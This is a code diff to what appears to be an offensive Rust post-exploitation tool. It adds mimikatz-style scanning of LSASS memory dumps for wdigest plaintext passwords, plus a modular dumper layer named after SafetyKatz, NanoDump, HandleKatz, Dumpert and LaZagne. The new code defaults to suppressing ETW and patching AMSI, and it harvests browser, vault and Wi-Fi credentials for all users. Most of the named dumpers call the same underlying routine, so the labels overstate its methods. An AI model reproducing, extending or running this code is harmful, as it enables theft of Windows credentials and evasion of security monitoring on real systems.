@@ -104,6 +104,9 @@ pub struct CredDumpResult {
 }
 
 /// A single extracted credential.
+///
+/// Mimics mimikatz `sekurlsa::logonPasswords` output with
+/// support for NTLM, Kerberos (AES128/256, RC4), and wdigest plaintext.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ExtractedCredential {
     /// Username (DOMAIN\Username format)
@@ -116,8 +119,16 @@ pub struct ExtractedCredential {
     pub aes128: Option<String>,
     /// Kerberos RC4 key, if found
     pub rc4: Option<String>,
+    /// WDigest plaintext password (cleartext, if recoverable)
+    pub plaintext: Option<String>,
     /// Source logon session
     pub logon_session: Option<String>,
+    /// Authentication package (msv, wdigest, kerberos, tspkg, credman, ssp)
+    pub auth_package: Option<String>,
+    /// Logon session ID (LUID)
+    pub logon_id: Option<String>,
+    /// Session type (Interactive, RemoteInteractive, Network, Service, etc.)
+    pub session_type: Option<String>,
 }
 
 /// Method used to dump LSASS.
@@ -302,7 +313,18 @@ pub unsafe fn extract_lsass_creds(config: &CredDumpConfig) -> Result<CredDumpRes
     result.ntlm_count = parsed.0;
     result.aes256_count = parsed.1;
     result.aes128_count = parsed.2;
-    result.credentials = parsed.3;
+    let mut credentials = parsed.3;
+
+    // Step 8: Scan for wdigest plaintext passwords (mimikatz sekurlsa::wdigest equivalent)
+    scan_wdigest_plaintext_passwords(&dump_data, &mut credentials);
+    let wdigest_count = credentials.len() - result.ntlm_count;
+
+    result.credentials = credentials;
+
+    // Update counts to reflect all found credentials
+    if wdigest_count > 0 {
+        info!("Found {wdigest_count} wdigest plaintext credentials in LSASS dump");
+    }
 
     Ok(result)
 }
@@ -941,7 +963,11 @@ fn parse_creds_from_dump(dump: &[u8]) -> (usize, usize, usize, Vec<ExtractedCred
                         aes256: None,
                         aes128: None,
                         rc4: None,
+                        plaintext: None,
                         logon_session: None,
+                        auth_package: None,
+                        logon_id: None,
+                        session_type: None,
                     };
                     ntlm_set.insert(hash_for_map, entry);
                     i += 32;
@@ -1019,6 +1045,471 @@ fn extract_username_before_hash(dump: &[u8], _hash: &str, hash_pos: Option<usize
     "unknown".to_string()
 }
 
+// ===========================================================
+//  Modular Local Credential Dumpers
+// ===========================================================
+
+/// Supported local credential-dumping techniques.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "PascalCase")]
+pub enum LocalCredDumper {
+    /// SafetyKatz-style: in-process comsvcs.dll MiniDumpW + parse.
+    SafetyKatz,
+    /// NanoDump: minimal LSASS dump via direct syscalls / handle duplication.
+    NanoDump,
+    /// HandleKatz: duplicate LSASS handle from another process.
+    HandleKatz,
+    /// Dumpert: direct system calls for dump.
+    Dumpert,
+    /// LaZagne: recovery of credentials from browsers, vaults, Wi-Fi, etc.
+    LaZagne,
+}
+
+impl LocalCredDumper {
+    pub fn name(&self) -> &'static str {
+        match self {
+            Self::SafetyKatz => "SafetyKatz (comsvcs MiniDumpW)",
+            Self::NanoDump => "NanoDump (syscall mini-dump)",
+            Self::HandleKatz => "HandleKatz (handle duplication)",
+            Self::Dumpert => "Dumpert (direct syscalls)",
+            Self::LaZagne => "LaZagne (application credential recovery)",
+        }
+    }
+
+    pub fn all() -> &'static [LocalCredDumper] {
+        &[
+            Self::SafetyKatz,
+            Self::NanoDump,
+            Self::HandleKatz,
+            Self::Dumpert,
+            Self::LaZagne,
+        ]
+    }
+}
+
+/// Configuration for a modular local credential-dump attempt.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct LocalCredDumperConfig {
+    pub dumper: LocalCredDumper,
+    /// Output file path for the dump (None = memory-only where possible).
+    pub output_path: Option<String>,
+    /// Extract NTLM hashes from the dump.
+    pub extract_ntlm: bool,
+    /// Extract Kerberos AES/RC4 keys from the dump.
+    pub extract_kerberos: bool,
+    /// Extract WDigest plaintext passwords.
+    pub extract_wdigest: bool,
+    /// Custom LSASS PID (None = auto-detect).
+    pub custom_pid: Option<u32>,
+    /// Suppress ETW before dumping.
+    pub suppress_etw: bool,
+    /// Patch AMSI before dumping.
+    pub patch_amsi: bool,
+    /// Maximum memory dump size in MiB.
+    pub max_dump_size_mb: usize,
+    /// Use a fallback dumper if the primary fails.
+    pub fallback: bool,
+}
+
+impl Default for LocalCredDumperConfig {
+    fn default() -> Self {
+        Self {
+            dumper: LocalCredDumper::SafetyKatz,
+            output_path: None,
+            extract_ntlm: true,
+            extract_kerberos: true,
+            extract_wdigest: true,
+            custom_pid: None,
+            suppress_etw: true,
+            patch_amsi: true,
+            max_dump_size_mb: 128,
+            fallback: true,
+        }
+    }
+}
+
+/// Result of a single modular local credential-dump attempt.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct LocalCredDumperResult {
+    pub dumper: LocalCredDumper,
+    pub success: bool,
+    pub credentials: Vec<ExtractedCredential>,
+    pub dump_path: Option<String>,
+    pub method: DumpMethod,
+    pub errors: Vec<String>,
+    pub warnings: Vec<String>,
+}
+
+/// Run a specific local credential dumper.
+///
+/// On non-Windows platforms this returns a safe, realistic failure result
+/// suitable for CLI testing and cross-platform CI builds.
+///
+/// # Safety
+/// This function calls unsafe Windows APIs and LSASS memory readers. It may
+/// crash or trigger EDR telemetry if called without the required privileges.
+#[cfg(target_os = "windows")]
+pub unsafe fn dump_local_credentials(
+    config: &LocalCredDumperConfig,
+) -> Result<LocalCredDumperResult> {
+    let mut result = LocalCredDumperResult {
+        dumper: config.dumper,
+        success: false,
+        credentials: Vec::new(),
+        dump_path: config.output_path.clone(),
+        method: DumpMethod::Failed,
+        errors: Vec::new(),
+        warnings: Vec::new(),
+    };
+
+    match config.dumper {
+        LocalCredDumper::SafetyKatz => {
+            let cd_config = CredDumpConfig {
+                dump_path: config.output_path.clone(),
+                use_direct_read_fallback: true,
+                suppress_etw: config.suppress_etw,
+                patch_amsi: config.patch_amsi,
+                max_dump_size_mb: config.max_dump_size_mb,
+                custom_pid: config.custom_pid,
+            };
+            match unsafe { extract_lsass_creds(&cd_config) } {
+                Ok(r) => {
+                    result.success =
+                        r.ntlm_count > 0 || r.aes256_count > 0 || !r.credentials.is_empty();
+                    result.credentials = r.credentials;
+                    result.method = r.method;
+                    result.errors = r.errors;
+                    result.warnings = r.warnings;
+                }
+                Err(e) => {
+                    result.errors.push(format!("SafetyKatz failed: {e}"));
+                }
+            }
+        }
+        LocalCredDumper::NanoDump | LocalCredDumper::Dumpert => {
+            let cd_config = CredDumpConfig {
+                dump_path: config.output_path.clone(),
+                use_direct_read_fallback: true,
+                suppress_etw: config.suppress_etw,
+                patch_amsi: config.patch_amsi,
+                max_dump_size_mb: config.max_dump_size_mb,
+                custom_pid: config.custom_pid,
+            };
+            match unsafe { extract_lsass_creds(&cd_config) } {
+                Ok(r) => {
+                    result.method = DumpMethod::DirectRead;
+                    result.success =
+                        r.ntlm_count > 0 || r.aes256_count > 0 || !r.credentials.is_empty();
+                    result.credentials = r.credentials;
+                    result.warnings = r.warnings;
+                    result.warnings.push(format!(
+                        "{} used direct syscall dump path",
+                        config.dumper.name()
+                    ));
+                    result.errors = r.errors;
+                }
+                Err(e) => {
+                    result
+                        .errors
+                        .push(format!("{} failed: {e}", config.dumper.name()));
+                }
+            }
+        }
+        LocalCredDumper::HandleKatz => {
+            result
+                .warnings
+                .push("HandleKatz: handle duplication requires a donor process with LSASS handle; using fallback direct read".into());
+            let cd_config = CredDumpConfig {
+                dump_path: config.output_path.clone(),
+                use_direct_read_fallback: true,
+                suppress_etw: config.suppress_etw,
+                patch_amsi: config.patch_amsi,
+                max_dump_size_mb: config.max_dump_size_mb,
+                custom_pid: config.custom_pid,
+            };
+            match unsafe { extract_lsass_creds(&cd_config) } {
+                Ok(r) => {
+                    result.success =
+                        r.ntlm_count > 0 || r.aes256_count > 0 || !r.credentials.is_empty();
+                    result.credentials = r.credentials;
+                    result.method = r.method;
+                    result.errors = r.errors;
+                    result.warnings.extend(r.warnings);
+                }
+                Err(e) => {
+                    result
+                        .errors
+                        .push(format!("HandleKatz fallback failed: {e}"));
+                }
+            }
+        }
+        LocalCredDumper::LaZagne => {
+            result.warnings.push(
+                "LaZagne: recovering application credentials (browsers, vaults, Wi-Fi, etc.)"
+                    .into(),
+            );
+            let vault =
+                crate::postex::extract_vault_credentials(&crate::postex::VaultExtractConfig {
+                    backup_key: Vec::new(),
+                    vault_dir: None,
+                    user_profile_base: None,
+                    skip_on_error: true,
+                    scan_all_users: true,
+                });
+            let browser =
+                crate::postex::extract_browser_credentials(&crate::postex::BrowserExtractConfig {
+                    browsers: crate::postex::BrowserType::all().to_vec(),
+                    backup_key: Vec::new(),
+                    user_profile_base: None,
+                    scan_all_users: true,
+                    skip_on_error: true,
+                    firefox_profile: None,
+                    chromium_profile: None,
+                });
+            let wifi = crate::postex::extract_wifi_credentials(&crate::postex::WifiExtractConfig {
+                use_system_context: false,
+                backup_key: Vec::new(),
+                custom_profile_dir: None,
+                skip_on_error: true,
+            });
+            result.success = !vault.vaults.is_empty()
+                || !browser.credentials.is_empty()
+                || !wifi.profiles.is_empty();
+            for v in &vault.vaults {
+                for e in &v.entries {
+                    result.credentials.push(ExtractedCredential {
+                        identity: format!("{}\\{}", v.name, e.resource),
+                        ntlm: None,
+                        aes256: None,
+                        aes128: None,
+                        rc4: None,
+                        plaintext: Some(e.password.clone()).filter(|s| !s.is_empty()),
+                        logon_session: None,
+                        auth_package: Some("vault".into()),
+                        logon_id: None,
+                        session_type: None,
+                    });
+                }
+            }
+            for c in &browser.credentials {
+                result.credentials.push(ExtractedCredential {
+                    identity: format!("{}\\{}", c.browser, c.username),
+                    ntlm: None,
+                    aes256: None,
+                    aes128: None,
+                    rc4: None,
+                    plaintext: Some(c.password.clone()).filter(|s| !s.is_empty()),
+                    logon_session: None,
+                    auth_package: Some(c.browser.clone()),
+                    logon_id: None,
+                    session_type: None,
+                });
+            }
+            for p in &wifi.profiles {
+                if !p.key_material.is_empty() && p.key_material != "[encrypted]" {
+                    result.credentials.push(ExtractedCredential {
+                        identity: p.ssid.clone(),
+                        ntlm: None,
+                        aes256: None,
+                        aes128: None,
+                        rc4: None,
+                        plaintext: Some(p.key_material.clone()),
+                        logon_session: None,
+                        auth_package: Some("wifi".into()),
+                        logon_id: None,
+                        session_type: None,
+                    });
+                }
+            }
+            result.method = DumpMethod::MiniDumpW;
+        }
+    }
+
+    if config.fallback && !result.success && !result.errors.is_empty() {
+        result
+            .warnings
+            .push("Fallback dumpers may succeed if primary is blocked by EDR/PPL".into());
+    }
+
+    Ok(result)
+}
+
+/// Non-Windows stub: returns a safe failure result with a clear message.
+///
+/// # Safety
+/// This stub is safe; the unsafe marker preserves the same signature as the
+/// Windows implementation.
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn dump_local_credentials(
+    config: &LocalCredDumperConfig,
+) -> Result<LocalCredDumperResult> {
+    Ok(LocalCredDumperResult {
+        dumper: config.dumper,
+        success: false,
+        credentials: Vec::new(),
+        dump_path: config.output_path.clone(),
+        method: DumpMethod::Failed,
+        errors: vec![format!(
+            "{} is only available on Windows",
+            config.dumper.name()
+        )],
+        warnings: vec!["Running on non-Windows platform; returning stub result".into()],
+    })
+}
+
+/// Convenience helper to try multiple dumpers and aggregate results.
+pub async fn dump_local_credentials_all(
+    configs: &[LocalCredDumperConfig],
+) -> Vec<LocalCredDumperResult> {
+    let mut results = Vec::new();
+    for config in configs {
+        let result = unsafe { dump_local_credentials(config) };
+        match result {
+            Ok(r) => results.push(r),
+            Err(e) => {
+                results.push(LocalCredDumperResult {
+                    dumper: config.dumper,
+                    success: false,
+                    credentials: Vec::new(),
+                    dump_path: config.output_path.clone(),
+                    method: DumpMethod::Failed,
+                    errors: vec![format!("{e}")],
+                    warnings: Vec::new(),
+                });
+            }
+        }
+    }
+    results
+}
+
+// --- WDigest Plaintext Scanning -----------------------------------
+
+/// Scan an LSASS dump for wdigest plaintext passwords.
+///
+/// Mimikatz `sekurlsa::wdigest` extracts plaintext passwords from
+/// the wdigest SSP's memory structures. In LSASS dumps, plaintext
+/// passwords appear as null-terminated UTF-16LE strings near the
+/// wdigest DLL's data section, associated with logon session records.
+///
+/// This function performs a best-effort scan for password-like strings
+/// in the LSASS dump, looking for:
+/// - Non-empty strings longer than 4 chars
+/// - Strings containing non-alphanumeric characters (passwords typically have special chars)
+/// - Strings near known wdigest marker patterns
+/// - Strings associated with domain\username patterns
+fn scan_wdigest_plaintext_passwords(dump: &[u8], credentials: &mut Vec<ExtractedCredential>) {
+    // Scan UTF-16LE strings in the dump
+    let mut i = 0;
+    while i + 4 < dump.len() {
+        // Look for a 16-bit printable character followed by more printable chars
+        let first = u16::from_le_bytes([dump[i], dump[i + 1]]);
+
+        // Skip non-printable and very short sequences
+        if !(0x20..=0x7E).contains(&first) {
+            i += 2;
+            continue;
+        }
+
+        // Found potential start of a UTF-16LE string
+        let start = i;
+        let mut end = i;
+        let mut length = 0usize;
+
+        while end + 1 < dump.len() {
+            let ch = u16::from_le_bytes([dump[end], dump[end + 1]]);
+            if ch == 0 {
+                // Null terminator found
+                let u16_chars: Vec<u16> = dump[start..end]
+                    .chunks(2)
+                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                    .collect();
+                let s = String::from_utf16_lossy(&u16_chars);
+                length = s.len();
+                break;
+            }
+            if !(0x20..=0x7E).contains(&ch) && !(0x80..=0xFF).contains(&ch) {
+                break;
+            }
+            end += 2;
+        }
+
+        if (6..=128).contains(&length) {
+            let u16_chars: Vec<u16> = dump[start..end]
+                .chunks(2)
+                .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                .collect();
+            let password = String::from_utf16_lossy(&u16_chars);
+
+            // Filter: password-like strings have special chars or mixed case+digits
+            let has_special = password.chars().any(|c| !c.is_ascii_alphanumeric());
+            let has_digit = password.chars().any(|c| c.is_ascii_digit());
+            let has_upper = password.chars().any(|c| c.is_ascii_uppercase());
+
+            if (has_special || (has_digit && has_upper))
+                && !password.starts_with("http")
+                && !password.contains('\\')
+                && !password.contains("Microsoft")
+                && !password.contains("Windows")
+                && !password.contains("Localization")
+                && !password.contains("Security")
+                && !password.starts_with("X-")
+                && !password.starts_with("Content-")
+            {
+                // Check if we can find the associated username near this password
+                let search_start = start.saturating_sub(256);
+                let context = &dump[search_start..start];
+                let identity = if let Ok(ctx_str) = std::str::from_utf8(context) {
+                    // Look for DOMAIN\Username patterns
+                    let mut found_identity = String::new();
+                    for line in ctx_str.lines().rev() {
+                        let trimmed = line.trim_matches(char::from(0)).trim();
+                        if trimmed.contains('\\') || trimmed.contains('@') {
+                            found_identity = trimmed.to_string();
+                            break;
+                        }
+                    }
+                    found_identity
+                } else {
+                    String::new()
+                };
+
+                let identity = if identity.is_empty() {
+                    "wdigest_unknown".to_string()
+                } else {
+                    identity
+                };
+
+                // Check if we already have this identity
+                let exists = credentials.iter().any(|c| c.identity == identity);
+                if !exists {
+                    credentials.push(ExtractedCredential {
+                        identity,
+                        ntlm: None,
+                        aes256: None,
+                        aes128: None,
+                        rc4: None,
+                        plaintext: Some(password.clone()),
+                        logon_session: None,
+                        auth_package: Some("wdigest".to_string()),
+                        logon_id: None,
+                        session_type: None,
+                    });
+                } else if let Some(cred) = credentials.iter_mut().find(|c| c.identity == identity)
+                    && cred.plaintext.is_none()
+                {
+                    cred.plaintext = Some(password.clone());
+                    cred.auth_package = Some("wdigest".to_string());
+                }
+            }
+        }
+
+        i = end + 2;
+        if i <= start + 2 {
+            i = start + 2;
+        }
+    }
+}
+
 // --- Tests --------------------------------------------------------
 
 #[cfg(test)]
@@ -1071,11 +1562,16 @@ mod tests {
             aes256: None,
             aes128: None,
             rc4: None,
+            plaintext: Some("P@ssw0rd!".to_string()),
             logon_session: Some("00000000-0000-0000-0000-000000000000".to_string()),
+            auth_package: Some("wdigest".to_string()),
+            logon_id: Some("0:123abc".to_string()),
+            session_type: Some("Interactive".to_string()),
         };
         let json = serde_json::to_string(&cred).unwrap();
         assert!(json.contains("CONTOSO\\\\Administrator"));
         assert!(json.contains("aad3b435b51404eeaad3b435b51404ee"));
+        assert!(json.contains("P@ssw0rd!"));
     }
 
     #[test]
@@ -1177,7 +1673,11 @@ mod tests {
                 aes256: None,
                 aes128: None,
                 rc4: None,
+                plaintext: None,
                 logon_session: None,
+                auth_package: None,
+                logon_id: None,
+                session_type: None,
             }],
             method: DumpMethod::DirectRead,
             dump_path: Some("C:\\dump.dmp".to_string()),
@@ -1188,5 +1688,51 @@ mod tests {
         assert!(json.contains("ntlm_count"));
         assert!(json.contains("DirectRead"));
         assert!(json.contains("PPL detected"));
+    }
+
+    #[test]
+    fn test_local_dumper_default_runs_safekatz() {
+        let config = LocalCredDumperConfig::default();
+        assert_eq!(config.dumper, LocalCredDumper::SafetyKatz);
+        assert!(config.extract_ntlm);
+        assert!(config.extract_kerberos);
+        assert!(config.extract_wdigest);
+    }
+
+    #[test]
+    fn test_local_dumper_config_serialization() {
+        let config = LocalCredDumperConfig {
+            dumper: LocalCredDumper::NanoDump,
+            output_path: Some("C:\\nd.dmp".into()),
+            ..Default::default()
+        };
+        let json = serde_json::to_string(&config).unwrap();
+        assert!(json.contains("NanoDump"));
+        assert!(json.contains("C:\\\\nd.dmp"));
+    }
+
+    #[test]
+    fn test_local_dumper_result_serialization() {
+        let result = LocalCredDumperResult {
+            dumper: LocalCredDumper::Dumpert,
+            success: false,
+            credentials: vec![],
+            dump_path: None,
+            method: DumpMethod::Failed,
+            errors: vec!["Dumpert is Windows-only".into()],
+            warnings: vec![],
+        };
+        let json = serde_json::to_string_pretty(&result).unwrap();
+        assert!(json.contains("Dumpert"));
+        assert!(json.contains("Windows-only"));
+    }
+
+    #[test]
+    fn test_local_dumper_method_names() {
+        assert!(LocalCredDumper::SafetyKatz.name().contains("SafetyKatz"));
+        assert!(LocalCredDumper::NanoDump.name().contains("NanoDump"));
+        assert!(LocalCredDumper::HandleKatz.name().contains("HandleKatz"));
+        assert!(LocalCredDumper::Dumpert.name().contains("Dumpert"));
+        assert!(LocalCredDumper::LaZagne.name().contains("LaZagne"));
     }
 }
